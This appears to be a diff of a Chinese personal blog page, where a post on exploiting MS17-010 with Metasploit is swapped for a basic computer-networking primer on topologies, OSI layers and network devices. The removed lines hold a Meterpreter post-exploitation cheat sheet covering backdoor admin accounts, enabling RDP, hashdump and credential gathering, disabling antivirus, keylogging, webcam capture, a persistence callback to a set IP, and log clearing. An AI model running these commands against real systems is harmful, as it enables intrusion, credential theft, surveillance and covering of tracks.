@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>如何利用  ms17-010开始进行渗透测试 | seemH</title>
+<title>计算机网络 | seemH</title>
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -87,111 +87,90 @@
       <div class="sm-12 md-8 col">
         <div class="paper">
           <article class="article">
-            <h1>如何利用  ms17-010开始进行渗透测试</h1>
+            <h1>计算机网络</h1>
             <p class="article-meta">
-              2021-09-22
-              
-                <a href="https://lhq159753.github.io/web.github.io/tag/aEz4gYwfn/" class="badge success">
-                  漏洞利用
-                </a>
+              2021-10-21
               
             </p>
             
-              <img src="https://lhq159753.github.io/web.github.io//post-images/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi.jpg" alt="如何利用  ms17-010开始进行渗透测试">
-            
             <div class="post-content">
-              <p>🕎</p>
-<figure data-type="image" tabindex="1"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310067918.jpg" alt="" loading="lazy"></figure>
-<pre><code>在进行渗透测试之前，先进行信息获取
-
-利用nmap -Pn 扫描目标主机是否有对应的端口开启
-进入msfconsole
-
-打开数据库：service postgresql start
-
-数据初始化：msfdb init
-
-信息收集获取目标机的IP地址
-
-使用msfsole攻击
-
-search：漏洞模块路径查询
-
-use：使用漏洞模块
-
-show options：加载攻击模块并配置参数
-
-set ：配置参数
-
-payload;攻击荷载
-
-RHOST：目标主机地址
-
-LHOST：本机主机地址
-
-run：执行
-
- 渗透思维导图
+              <p>🐧<br>
+<strong>计算机网络是由一根通信介质将不同位置的且相互独立的计算机连接起来，并实现资源共享与数据通信</strong></p>
+<p>计算机网络拓扑结构<br>
+<strong>（1）总线型</strong><br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634872838598.png" alt="" loading="lazy"><br>
+由由一根同轴电缆连接，当线路出问题时候，会导致整个网络是去通信。</p>
+<p><strong>（2）环型</strong><br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634872919934.png" alt="" loading="lazy"></p>
+<pre><code>由站点和连接点形成一个闭合环，连接操作也简单方便，但是一个节点故障会引起全网故障，排查比较困难
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310085495.png" alt="" loading="lazy"></figure>
-<pre><code>🏳️‍🌈🏳️‍🌈🏳️‍🌈  在使用 Meterpreter payload攻击模块下
-首先创建一个用户：net user +名字 +密码 /add
-把刚才创建的用户设置为管理员
-net localgroup administrators +名字 /add
-在卡里把win7的远程桌面服务打开
-C:\Windows\system32&gt;G ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWREORD /d 0 /f
+<p><strong>（3）树型</strong><br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634873351761.png" alt="" loading="lazy"></p>
+<pre><code>树形结构易于拓展，且容易排查故障点，但是对于根节点的压力比较大若出现故障，会引起全网不能正常工作
 </code></pre>
-<p>然后在kali终端 打开rdesktop + 目标ip地址  ：3389</p>
-<p>🌲后期渗透<br>
-sysinfo             #查看目标主机系统信息<br>
-run scraper         #查看目标主机详细信息<br>
-run hashdump        #导出密码的哈希<br>
-load kiwi           #加载<br>
-ps                  #查看目标主机进程信息<br>
-pwd                 #查看目标当前目录(windows)<br>
-getlwd              #查看目标当前目录(Linux)<br>
-search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>
-download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>
-upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程<br>
-PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>
-idletime            #查看主机运行时间<br>
-getuid              #查看获取的当前权限<br>
-getsystem           #提权<br>
-run  killav         #关闭杀毒软件<br>
-screenshot          #截图<br>
-webcam_list         #查看目标主机的摄像头<br>
-webcam_snap         #拍照<br>
-webcam_stream       #开视频<br>
-execute  参数  -f 可执行文件   #执行可执行程序<br>
-run getgui -u hack -p 123    #创建hack用户，密码为123<br>
-run getgui -e                #开启远程桌面<br>
-keyscan_start                #开启键盘记录功能<br>
-keyscan_dump                 #显示捕捉到的键盘记录信息<br>
-keyscan_stop                 #停止键盘记录功能<br>
-uictl  disable  keyboard     #禁止目标使用键盘<br>
-uictl  enable   keyboard     #允许目标使用键盘<br>
-uictl  disable  mouse        #禁止目标使用鼠标<br>
-uictl  enable   mouse        #允许目标使用鼠标<br>
-load                         #使用扩展库<br>
-run				             #使用扩展库<br>
-run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接<br>
-192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>
-portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址<br>
-clearev                       #清除日志</p>
-<p>run post/windows/manage/migrate                  #自动进程迁移<br>
-run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上<br>
-run post/windows/manage/killav                   #关闭杀毒软件<br>
-run post/windows/manage/enable_rdp               #开启远程桌面服务<br>
-run post/windows/manage/autoroute                #查看路由信息<br>
-run post/windows/gather/enum_logged_on_users     #列举当前登录的用户<br>
-run post/windows/gather/enum_applications        #列举应用程序<br>
-run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>
-run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
+<p><strong>（4）网型</strong><br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634873559371.png" alt="" loading="lazy"><br>
+该类型的拓扑应用我们生活中很多，同时能保障网络的效率，但是网络构建的话比较复杂且成本也相对较高</p>
+<p>根据地理位置分为三大网络<br>
+局域网（LAN）：  一个公司或者家庭<br>
+城域网（MAN）：一个地区，城市，<br>
+广域网（WAN）:   一个国家</p>
+<pre><code>**网络的OSI七层结构**
+</code></pre>
+<p>7️⃣<strong>应用层 <strong>：为用户提供一个应用的接口，同时也为用户直接提供各种网络服务。<br>
+⏫<br>
+6️⃣</strong>表示层</strong>：用于应用层的数据的编码和转换和加密。<br>
+⏫<br>
+5️⃣<strong>会话层</strong>：用于建立，管理和终止表示层实体之间的通信会话，类似找房子的中介<br>
+⏫<br>
+4️⃣<strong>传输层</strong>：建立，管理和维护为上层协议提供端到端的可靠和数据透明的传输服务(端口号)TCP UDP<br>
+在这一层作用<br>
+⏫<br>
+3️⃣<strong>网络层</strong>：通过IP地址来寻找目标主机来建立连接，同时选择合适的路由和交换节点（IP层）按照          给的地址传送给目的端的传输层<br>
+⏫<br>
+2️⃣<strong>数据链路层</strong>：把比特流组合成数据帧，在这一层使用（MAC地址）来访问介质，且进行差错检测<br>
+⏫<br>
+1️⃣<strong>物理层</strong>：通过物理常见的物理介质来传输比特流。</p>
+<p>**    TCP/IP参考模型与OSI七层对应关系**</p>
+<figure data-type="image" tabindex="1"><img src="https://lhq159753.github.io/web.github.io//post-images/1634896690821.png" alt="" loading="lazy"></figure>
+<p><strong>常见的网络设备</strong></p>
+<p>交换机:<br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634896813472.png" alt="" loading="lazy"></p>
+<p>以太网交换机了解每一端口相连设备的MAC地址，并将地址同相应的端口映射起来存放在交换机缓存中的MAC地址表中交换机就以下操作<br>
+转发/过滤：当一个数据帧的目的地址在MAC地址表中有映射时，它被转发到连接目的节点的端口而不是所有端口（如该数据帧为广播/组播帧则转发至所有端口）<br>
+消除回路：当交换机包括一个冗余回路时，以太网交换机通过生成树协议避免回路的产生，同时允许存在后备路径。<br>
+在OSI七层中交换机属于OSI第二层即数据链路层设备。它根据MAC地址寻址，通过站表选择路由，站表的建立和维护由交换机自动进行</p>
+<p>路由器：<br>
+<img src="https://lhq159753.github.io/web.github.io//post-images/1634897153168.png" alt="" loading="lazy"></p>
+<pre><code>路由器属于OSI第三层即网络层设备，它根据IP地址进行寻址，通过路由表路由协议产生
+</code></pre>
+<p>路由器的主要任务是把通信引导到目的地网络，然后到达特定的节点站地址。后一个功能是通过网络地址分解完成的。例如，把网络地址部分的分配指定成网络、子网和区域的一组节点，其余的用来指明子网中的特别站。分层寻址允许路由器对有很多个节站的网络存储导址信息。</p>
+<p><strong>传输介质：</strong><br>
+现在传输介质有双绞线，和光纤</p>
+<p><strong>网络协议</strong><br>
+计算机网络中还有很多协议，首先要了解网络协议的三个要素</p>
+<p>网络协议三要素：<br>
+⛔️语义。语义是解释控制信息每个部分的意义。它规定了需要发出何种控制信息，以及完成的动作与做出什么样的响应。<br>
+⛔️ 语法。语法是用户数据与控制信息的结构与格式，以及数据出现的顺序。<br>
+⛔️ 时序。时序是对事件发生顺序的详细说明。（也可称为“同步”）。<br>
+更深入了解可以去大佬了解一波<br>
+https://blog.csdn.net/qq_23864697/article/details/89015659</p>
 
             </div>
           </article>
         </div>
         <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://lhq159753.github.io/web.github.io/post/zheng-ze-biao-da-shi/">
+                <h3 class="post-title">
+                  正则表达式
+                </h3>
+              </a>
+            </div>
           
         </div>
         
@@ -267,7 +246,7 @@ run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
     </div>
     <div class="row">
       
-        <a href="https://lhq159753.github.io/web.github.io/tag/kVCvPKx8w/" class="badge warning">
+        <a href="https://lhq159753.github.io/web.github.io/tag/kVCvPKx8w/" class="badge secondary">
           正则表达式
         </a>
       
@@ -275,7 +254,7 @@ run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
           liunx 运维
         </a>
       
-        <a href="https://lhq159753.github.io/web.github.io/tag/aEz4gYwfn/" class="badge secondary">
+        <a href="https://lhq159753.github.io/web.github.io/tag/aEz4gYwfn/" class="badge ">
           漏洞利用
         </a>
       
